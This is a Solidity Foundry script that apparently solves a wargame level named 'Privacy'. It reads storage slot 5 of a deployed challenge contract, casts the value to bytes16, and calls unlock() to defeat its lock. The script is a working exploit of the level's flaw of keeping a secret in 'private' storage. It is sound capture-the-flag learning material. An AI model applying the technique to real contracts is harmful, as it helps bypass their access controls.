/*
The creator of this contract was careful enough to protect the sensitive areas of its storage.

Unlock this contract to beat the level.

Things that might help:

Understanding how storage works
Understanding how parameter parsing works
Understanding how casting works
Tips:

Remember that metamask is just a commodity. Use another tool if it is presenting problems. Advanced gameplay could involve using remix, or your own web3 provider.

*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Privacy} from "src/Privacy.sol";
import {Script} from "lib/forge-std/src/Script.sol";
import {console} from "lib/forge-std/src/console.sol";

contract PrivacySolution is Script {
    Privacy public privacy = Privacy(0x34674dcEd29F37FedBF39807d2607d690FC24681);

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        console.log(privacy.locked());
        bytes32 dataFromStorage = vm.load(address(privacy), bytes32(uint256(5)));
        privacy.unlock(bytes16(dataFromStorage));
        console.log(privacy.locked());
        vm.stopBroadcast();
    }

    fallback() external payable {}
    receive() external payable {}
}
